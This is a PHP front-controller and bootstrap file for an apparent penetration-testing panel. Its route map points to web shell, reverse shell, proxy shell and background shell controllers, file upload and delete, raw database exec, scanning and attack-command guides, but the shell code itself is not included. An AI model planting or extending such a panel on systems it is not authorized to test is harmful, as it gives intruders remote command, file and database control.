define ( "DEFAULT_FRAMEWORK_FOLDER" , ( ( ! empty( DEVLOP ) ) ? ( DEVELOP_DEFAULT_FRAMEWORK_FOLDER ) : ( PRODUCTION_DEFAULT_FRAMEWORK_FOLDER ) ) );
define ( "THIRD_PARTY_CLASS_LIBRARIES" , dirname ( __FILE__ ) );


define ( "WIRESHARK_DOCKER_IPV4" , "((ip.src_host==172.17.0.1 and ip.dst_host==172.17.0.2) or (ip.src_host==172.17.0.2 and ip.dst_host==172.17.0.1)) or (ip.addr==127.0.0.1) and (tcp.srcport==40668 or tcp.dstport==40668) and (http)" );
define ( "WIRESHARK_DOCKER_IPV6" , "ip.version==6 and (not icmpv6 ) and (not tcp) and (not udp)" );

define ( "OPENSSL_RAW_DATA_OR_OPENSSL_ZERO_PADDING" , ( OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING ) );
define ( "SIZE_UNSIGNED_CHAR_16" , 16 );

try {
    check_privilege_environment ();
} catch ( \Exception $e ) {
    print_r ( $e->getMessage () );
    exit( 0 );
}

if ( ( ! isset( $_SERVER ) ) || ( ! is_array ( $_SERVER ) ) ) {
    $_SERVER = array ();
}
if ( ( ! isset( $_ENV ) ) || ( ! is_array ( $_ENV ) ) ) {
    $_ENV = array ();
}
if ( ( ! isset( $_SESSION ) ) || ( ! is_array ( $_SESSION ) ) ) {
    $_SESSION = array ();
}
if ( ( ! isset( $_COOKIE ) ) || ( ! is_array ( $_COOKIE ) ) ) {
    $_COOKIE = array ();
}
if ( ( ! isset( $_REQUEST ) ) || ( ! is_array ( $_REQUEST ) ) ) {
    $_REQUEST = array ();
}
if ( ( ! isset( $_GET ) ) || ( ! is_array ( $_GET ) ) ) {
    $_GET = array ();
}
if ( ( ! isset( $_POST ) ) || ( ! is_array ( $_POST ) ) ) {
    $_POST = array ();
}
if ( ( ! isset( $_FILES ) ) || ( ! is_array ( $_FILES ) ) ) {
    $_FILES = array ();
}

if ( DEVLOP ) {

    ini_set ( "display_errors" , 1 );
    ini_set ( "error_reporting" , E_ERROR );
    ini_set ( "error_log" , 'logfile' );
    ini_set ( "log_errors" , 1 );
    ini_set ( "include_path" , "." );

    error_reporting ( E_ALL ^ E_WARNING );

    define ( 'WEB_DIR' , dirname ( __FILE__ ) );
    define ( 'APP_DIR' , dirname ( __FILE__ ) );
    define ( 'CLI_DIR' , dirname ( __FILE__ ) );
    define ( 'CONFIG_DIR' , dirname ( __FILE__ ) );
    define ( 'ROOT_DIR' , $_SERVER[ 'DOCUMENT_ROOT' ] );
    define ( 'INDEX_FILE_URI' , str_replace ( $_SERVER[ "DOCUMENT_ROOT" ] , "" , $_SERVER[ "SCRIPT_FILENAME" ] ) );

} else {

    ini_set ( "display_errors" , 0 );
    ini_set ( "error_reporting" , E_ERROR );
    ini_set ( "error_log" , 'logfile' );
    ini_set ( "log_errors" , 0 );
    ini_set ( "include_path" , "." );

    error_reporting ( E_ALL ^ E_WARNING );

    define ( 'WEB_DIR' , dirname ( __FILE__ ) );
    define ( 'APP_DIR' , dirname ( __FILE__ ) );
    define ( 'CLI_DIR' , dirname ( __FILE__ ) );
    define ( 'CONFIG_DIR' , dirname ( __FILE__ ) );
    define ( 'ROOT_DIR' , $_SERVER[ 'DOCUMENT_ROOT' ] );
    define ( 'INDEX_FILE_URI' , str_replace ( $_SERVER[ "DOCUMENT_ROOT" ] , "" , $_SERVER[ "SCRIPT_FILENAME" ] ) );
}

$GLOBALS[ "ROUTE_MAPS" ] = array (
    "/"                                                           => "Class_Controller_Default::index" ,
    "/init"                                                       => "Class_Controller_Init::index" ,
    "/init_user_info"                                             => "Class_Controller_Init::init_user_info" ,
    "/login"                                                      => "Class_Controller_Login::index" ,
    "/logout"                                                     => "Class_Controller_Logout::index" ,
    "/build"                                                      => "Class_Controller_Build::index" ,
    "/encode_build"                                               => "Class_Controller_Build::encode_build" ,
    "/decode_build"                                               => "Class_Controller_Build::decode_build" ,
    "/user"                                                       => "Class_Controller_User::index" ,
    "/user/user_info"                                             => "Class_Controller_User::user_info" ,
    "/user/create_production_privilege_user_password"             => "Class_Controller_User::create_production_privilege_user_password" ,
    "/server"                                                     => "Class_Controller_Server::index" ,
    "/server/server_info"                                         => "Class_Controller_Server::server_info" ,
    "/session"                                                    => "Class_Controller_Session::index" ,
    "/session/session_info"                                       => "Class_Controller_Session::session_info" ,
    "/cookie"                                                     => "Class_Controller_Cookie::index" ,
    "/cookie/cookie_info"                                         => "Class_Controller_Cookie::cookie_info" ,
    "/index"                                                      => "Class_Controller_Index::index" ,
    "/debug"                                                      => "Class_Controller_Index::debug" ,
    "/guide"                                                      => "Class_Controller_PenetrationTestCommands::index" ,
    "/guide/penetration_test_commands"                            => "Class_Controller_PenetrationTestCommands::index" ,
    "/guide/penetration_test_commands/information_gathering"      => "Class_Controller_PenetrationTestCommands::information_gathering" ,
    "/guide/penetration_test_commands/vulnerability_analysis"     => "Class_Controller_PenetrationTestCommands::vulnerability_analysis" ,
    "/guide/penetration_test_commands/web_program"                => "Class_Controller_PenetrationTestCommands::web_program" ,
    "/guide/penetration_test_commands/database_evaluation"        => "Class_Controller_PenetrationTestCommands::database_evaluation" ,
    "/guide/penetration_test_commands/password_attack"            => "Class_Controller_PenetrationTestCommands::password_attack" ,
    "/guide/penetration_test_commands/wireless_attacks"           => "Class_Controller_PenetrationTestCommands::wireless_attacks" ,
    "/guide/penetration_test_commands/reverse_engineering"        => "Class_Controller_PenetrationTestCommands::reverse_engineering" ,
    "/guide/penetration_test_commands/vulnerability_exploitation" => "Class_Controller_PenetrationTestCommands::vulnerability_exploitation" ,
    "/guide/penetration_test_commands/sniff_deception"            => "Class_Controller_PenetrationTestCommands::sniff_deception" ,
    "/guide/penetration_test_commands/permission_maintenance"     => "Class_Controller_PenetrationTestCommands::permission_maintenance" ,
    "/guide/penetration_test_commands/data_forensics"             => "Class_Controller_PenetrationTestCommands::data_forensics" ,
    "/guide/penetration_test_commands/reporting"                  => "Class_Controller_PenetrationTestCommands::reporting" ,
    "/guide/penetration_test_commands/social_engineering"         => "Class_Controller_PenetrationTestCommands::social_engineering" ,
    "/guide/adversarial_exercise"                                 => "Class_Controller_Guide::adversarial_exercise" ,
    "/guide/security_managements_software"                        => "Class_Controller_Guide::security_managements_software" ,
    "/guide/vulnerability_warehouse"                              => "Class_Controller_Guide::vulnerability_warehouse" ,
    "/guide/part_time_projects"                                   => "Class_Controller_Guide::part_time_projects" ,
    "/clear"                                                      => "Class_Controller_Clear::index" ,
    "/memory"                                                     => "Class_Controller_Memory::index" ,
    "/memory/system"                                              => "Class_Controller_Memory::system" ,
    "/memory/list"                                                => "Class_Controller_Memory::show_list" ,
    "/memory/search"                                              => "Class_Controller_Memory::show_search" ,
    "/memory/detail"                                              => "Class_Controller_Memory::show_detail" ,
    "/memory/add"                                                 => "Class_Controller_Memory::add" ,
    "/memory/edit"                                                => "Class_Controller_Memory::edit" ,
    "/memory/delete"                                              => "Class_Controller_Memory::delete" ,
    "/memory/clear"                                               => "Class_Controller_Memory::clear" ,
    "/file"                                                       => "Class_Controller_File::index" ,
    "/file/explorer"                                              => "Class_Controller_File::show_explorer" ,
    "/file/search"                                                => "Class_Controller_File::show_search" ,
    "/file/detail"                                                => "Class_Controller_File::show_detail" ,
    "/file/create"                                                => "Class_Controller_File::show_create" ,
    "/file/upload"                                                => "Class_Controller_File::show_upload" ,
    "/file/edit"                                                  => "Class_Controller_File::show_edit" ,
    "/file/delete"                                                => "Class_Controller_File::show_delete" ,
    "/file/clear"                                                 => "Class_Controller_File::show_clear" ,
    "/database"                                                   => "Class_Controller_Database::index" ,
    "/database/query"                                             => "Class_Controller_Database::query" ,
    "/database/exec"                                              => "Class_Controller_Database::exec" ,
    "/security"                                                   => "Class_Controller_Security::index" ,
    "/security/url"                                               => "Class_Controller_Security::url" ,
    "/security/base64"                                            => "Class_Controller_Security::base64" ,
    "/security/sha1"                                              => "Class_Controller_Security::sha1" ,
    "/security/md5"                                               => "Class_Controller_Security::md5" ,
    "/security/crc32"                                             => "Class_Controller_Security::crc32" ,
    "/security/crypt"                                             => "Class_Controller_Security::crypt" ,
    "/security/hash_hmac"                                         => "Class_Controller_Security::hash_hmac" ,
    "/security/openssl"                                           => "Class_Controller_Security::openssl" ,
    "/security/hash"                                              => "Class_Controller_Security::hash" ,
    "/security/password_hash"                                     => "Class_Controller_Security::password_hash" ,
    "/security/sodium"                                            => "Class_Controller_Security::sodium" ,
    "/scan"                                                       => "Class_Controller_Scan::index" ,
    "/scan/webs"                                                  => "Class_Controller_Scan::webs" ,
    "/scan/domain"                                                => "Class_Controller_Scan::domain" ,
    "/scan/tamperproof"                                           => "Class_Controller_Scan::tamperproof" ,
    "/elf"                                                        => "Class_Controller_Elf::index" ,
    "/elf/elf64"                                                  => "Class_Controller_Elf::elf64" ,
    "/elf/elf_h"                                                  => "Class_Controller_Elf::elf_h" ,
    "/shell"                                                      => "Class_Controller_Shell::index" ,
    "/shell/web_shell"                                            => "Class_Controller_Shell::web_shell" ,
    "/shell/server_shell"                                         => "Class_Controller_Shell::server_shell" ,
    "/shell/server_shell_client"                                  => "Class_Controller_Shell::server_shell_client" ,
    "/shell/reverse_shell"                                        => "Class_Controller_Shell::reverse_shell" ,
    "/shell/background_shell"                                     => "Class_Controller_Shell::background_shell" ,
    "/shell/proxy_shell"                                          => "Class_Controller_ProxyShell::index" ,
    "/shell/proxy_shell/create_session_id"                        => "Class_Controller_ProxyShell::create_session_id" ,
    "/shell/proxy_shell/clear_session_id"                         => "Class_Controller_ProxyShell::clear_session_id" ,
    "/shell/proxy_shell/send"                                     => "Class_Controller_ProxyShell::send" ,
    "/shell/proxy_shell/receive"                                  => "Class_Controller_ProxyShell::receive" ,
    "/shell/proxy_shell/listen"                                   => "Class_Controller_ProxyShell::listen" ,
    "/chat"                                                       => "Class_Controller_Chat::index" ,
    "/chat/server_chat"                                           => "Class_Controller_Chat::server_chat" ,
    "/chat/reverse_chat"                                          => "Class_Controller_Chat::reverse_chat" ,
    "/router"                                                     => "Class_Controller_Router::index" ,
    "/wget"                                                       => "Class_Controller_Wget::index" ,
    "/report"                                                     => "Class_Controller_Report::index" ,
    "/report/create_vulnerability_report"                         => "Class_Controller_Report::create_vulnerability_report" ,
    "/report/edit_vulnerability_report"                           => "Class_Controller_Report::edit_vulnerability_report" ,
    "/report/delete_vulnerability_report"                         => "Class_Controller_Report::delete_vulnerability_report" ,
    "/report/show_vulnerability_report"                           => "Class_Controller_Report::show_vulnerability_report" ,
    "/report/export_vulnerability_report"                         => "Class_Controller_Report::export_vulnerability_report" ,
    "/report/clear_vulnerability_report"                          => "Class_Controller_Report::clear_vulnerability_report" ,
    "/test"                                                       => "Class_Controller_Test::index" ,
);

function env_init ()
{
    if ( is_cli () ) {
        global $_SERVER;
        global $_ENV;
        global $_SESSION;
        global $_COOKIE;
        global $_REQUEST;
        global $_GET;
        global $_POST;
        global $_FILES;
    }
    if ( ( ! isset( $_SERVER[ "DOCUMENT_ROOT" ] ) ) || ( ! is_string ( $_SERVER[ "DOCUMENT_ROOT" ] ) ) ) {
        $_SERVER[ "DOCUMENT_ROOT" ] = dirname ( __FILE__ );
    }
    if ( ( ! isset( $_SERVER[ "SCRIPT_FILENAME" ] ) ) || ( ! is_string ( $_SERVER[ "SCRIPT_FILENAME" ] ) ) ) {
        $_SERVER[ "SCRIPT_FILENAME" ] = __FILE__;
    }

    if ( ! isset( $_SERVER[ "HTTP_X_FORWARDED_FOR" ] ) ) {
        $_SERVER[ "HTTP_X_FORWARDED_FOR" ] = "";
    }
    if ( empty( $_REQUEST[ "url" ] ) ) {
        $_REQUEST[ "url" ] = "/";
    }
    if ( is_cli () ) {
        cli_parameter_to_request ();
    }
    $_SERVER[ "REQUEST_URI" ] = str_replace ( "\\" , "/" , $_REQUEST[ "url" ] );
    if ( array_key_exists ( "url" , $_REQUEST ) ) {
        unset( $_REQUEST[ "url" ] );
    }
    if ( array_key_exists ( "url" , $_GET ) ) {
        unset( $_GET[ "url" ] );
    }
    if ( array_key_exists ( "url" , $_POST ) ) {
        unset( $_POST[ "url" ] );
    }
}

function cli_parameter_to_request ()
{
    if ( is_cli () ) {
        global $_SERVER;
        global $_REQUEST;
    }
    if ( ( ! empty( $_SERVER[ 'argv' ] ) ) && ( is_array ( $_SERVER[ 'argv' ] ) ) && ( count ( $_SERVER[ 'argv' ] ) > 1 ) ) {
        $_cli_params_string      = urldecode ( $_SERVER[ 'argv' ][ 1 ] );
        $_cli_param_string_group = explode ( "?" , $_cli_params_string );
        $_cli_uri                = $_cli_param_string_group[ 0 ];
        $_params_string_group    = array ();
        if ( count ( $_cli_param_string_group ) > 1 ) {
            $_params_string_group = explode ( "&" , $_cli_param_string_group[ 1 ] );
        }
        foreach ( $_params_string_group as $index => $param_string ) {
            if ( strpos ( $param_string , "=" ) === false ) {
                throw new Exception( "cli params format is error" , 0 );
            }
            $item                   = explode ( "=" , $param_string );
            $_REQUEST[ $item[ 0 ] ] = urldecode ( $item[ 1 ] );
        }
        $_REQUEST[ "url" ] = $_cli_uri;
    } else {
        if ( ( ! isset( $_REQUEST ) ) || ( ! is_array ( $_REQUEST ) ) ) {
            $_REQUEST = array ();
        }
        if ( empty( $_REQUEST[ "url" ] ) ) {
            $_REQUEST[ "url" ] = "/";
        }
    }
}

function load_class ( $class )
{
    if ( ! class_exists ( $class ) ) {
        $filename = $class . ".php";
        if ( ( ! file_exists ( $filename ) ) && ( ! file_exists ( DEFAULT_FRAMEWORK_FOLDER . DIRECTORY_SEPARATOR . $filename ) ) && ( ! file_exists ( THIRD_PARTY_CLASS_LIBRARIES . DIRECTORY_SEPARATOR . $filename ) ) ) {
            throw new Exception( "class file " . $filename . " not found" , 9000000001 );
        } else {
            if ( file_exists ( $filename ) ) {
                include_once ( $filename );
            } else if ( file_exists ( DEFAULT_FRAMEWORK_FOLDER . DIRECTORY_SEPARATOR . $filename ) ) {
                include_once ( DEFAULT_FRAMEWORK_FOLDER . DIRECTORY_SEPARATOR . $filename );
            } else if ( file_exists ( THIRD_PARTY_CLASS_LIBRARIES . DIRECTORY_SEPARATOR . $filename ) ) {
                include_once ( THIRD_PARTY_CLASS_LIBRARIES . DIRECTORY_SEPARATOR . $filename );
            }
        }
    }
}

function load_interface ( $interface )
{
    if ( ! interface_exists ( $interface ) ) {
        $filename = $interface . ".php";

        if ( ( ! file_exists ( $filename ) ) && ( ! file_exists ( DEFAULT_FRAMEWORK_FOLDER . DIRECTORY_SEPARATOR . $filename ) ) && ( ! file_exists ( THIRD_PARTY_CLASS_LIBRARIES . DIRECTORY_SEPARATOR . $filename ) ) ) {
            throw new Exception( "interface file " . $filename . " not found" , 0 );
        } else {
            if ( file_exists ( $filename ) ) {
                include_once ( $filename );
            } else if ( file_exists ( DEFAULT_FRAMEWORK_FOLDER . DIRECTORY_SEPARATOR . $filename ) ) {
                include_once ( DEFAULT_FRAMEWORK_FOLDER . DIRECTORY_SEPARATOR . $filename );
            } else if ( file_exists ( THIRD_PARTY_CLASS_LIBRARIES . DIRECTORY_SEPARATOR . $filename ) ) {
                include_once ( THIRD_PARTY_CLASS_LIBRARIES . DIRECTORY_SEPARATOR . $filename );
            }
        }
    }
}

function exception_handler ( $exception )
{
    if ( is_cli () ) {
        global $_SERVER;
        global $_REQUEST;
    }
    if ( ! empty( DEVLOP ) ) {
        if ( is_cli () ) {
            Class_Base_Response::output ( $exception , "object" , 0 );
        } else {
            Class_Base_Response::output ( ( '<a href="' . urldecode ( Class_Base_Response::get_http_referer ( 1 ) ) . '">Return to the previous page ! </a>' . chr ( 10 ) . '<span>exception : </span>' . print_r ( $exception , true ) ) , "text" , 1 );
        }
    } else {
        if ( ! empty( DEBUG ) ) {
            if ( is_cli () ) {
                Class_Base_Response::output ( $exception , "object" , 0 );
            } else {
                Class_Base_Response::output ( ( '<a href="' . urldecode ( Class_Base_Response::get_http_referer ( 1 ) ) . '">Return to the previous page ! </a>' . chr ( 10 ) . '<span>exception : </span>' . print_r ( $exception , true ) ) , "text" , 1 );
            }
        } else {
            if ( is_cli () ) {
                Class_Base_Response::output ( array ( "code" => $exception->getCode () , "message" => $exception->getMessage () ) , "object" , 0 );
            } else {
                Class_Base_Response::output ( ( '<a href="' . urldecode ( Class_Base_Response::get_http_referer ( 1 ) ) . '">Return to the previous page ! </a>' . chr ( 10 ) . '<span>exception : </span>' . print_r ( array ( "code" => $exception->getCode () , "message" => $exception->getMessage () ) , true ) ) , "text" , 1 );
            }
        }
    }

    exit( 1 );
}

function error_handler ( $code , $message , $file , $line )
{
    if ( is_cli () ) {
        global $_SERVER;
        global $_REQUEST;
    }
    if ( ! empty( DEVLOP ) ) {
        if ( is_cli () ) {
            Class_Base_Response::output ( ( new \Exception( "code : " . $code . " , file : " . $file . " , line : " . $line . " : " . $message , $code ) ) , "object" , 0 );
        } else {
            Class_Base_Response::output ( '<a href="' . urldecode ( Class_Base_Response::get_http_referer ( 1 ) ) . '">Return to the previous page ! </a>' . chr ( 10 ) . '<span>exception : </span>' . print_r ( new \Exception( "code : " . $code . " , file : " . $file . " , line : " . $line . " : " . $message , $code ) , true ) , "text" , 1 );
        }
    } else {
        if ( ! empty( DEBUG ) ) {
            if ( is_cli () ) {
                Class_Base_Response::output ( ( new \Exception( "code : " . $code . " , file : " . $file . " , line : " . $line . " : " . $message , $code ) ) , "object" , 0 );
            } else {
                Class_Base_Response::output ( '<a href="' . urldecode ( Class_Base_Response::get_http_referer ( 1 ) ) . '">Return to the previous page ! </a>' . chr ( 10 ) . '<span>exception : </span>' . print_r ( new \Exception( "code : " . $code . " , file : " . $file . " , line : " . $line . " : " . $message , $code ) , true ) , "text" , 1 );
            }
        } else {
            if ( is_cli () ) {
                Class_Base_Response::output ( ( new \Exception( $message , $code ) ) , "object" , 0 );
            } else {
                Class_Base_Response::output ( '<a href="' . urldecode ( Class_Base_Response::get_http_referer ( 1 ) ) . '">Return to the previous page ! </a>' . chr ( 10 ) . '<span>exception : </span>' . print_r ( new \Exception( $message , $code ) , true ) , "text" , 1 );
            }
        }
    }
    exit( 1 );
}

function shutdown_function ()
{

}


spl_autoload_register ( "load_class" );
set_exception_handler ( "exception_handler" );
set_error_handler ( "error_handler" , E_ERROR );
register_shutdown_function ( "shutdown_function" );

function main ()
{
    if ( is_cli () ) {
        global $_SERVER;
        global $_REQUEST;
    }
    try {
        env_init ();
        Class_Main::route_execute ();

    } catch ( Exception $e ) {
        if ( ! empty( DEVLOP ) ) {
            if ( is_cli () ) {
                Class_Base_Response::output ( $e , "object" , 0 );
            } else {
                Class_Base_Response::output ( print_r ( $e , true ) , "text" );
            }
        } else {
            if ( ! empty( $_REQUEST[ "debug" ] ) ) {
                if ( is_cli () ) {
                    Class_Base_Response::output ( $e , "object" , 0 );
                } else {
                    Class_Base_Response::output ( print_r ( $e , true ) , "text" );
                }
            } else {
                if ( is_cli () ) {
                    Class_Base_Response::output ( $e , "object" , 0 );
                } else {
                    Class_Base_Response::output ( print_r ( $e , true ) , "text" );
                }
            }
        }
    }
}

function index ()
{
    main ();
}

index ();



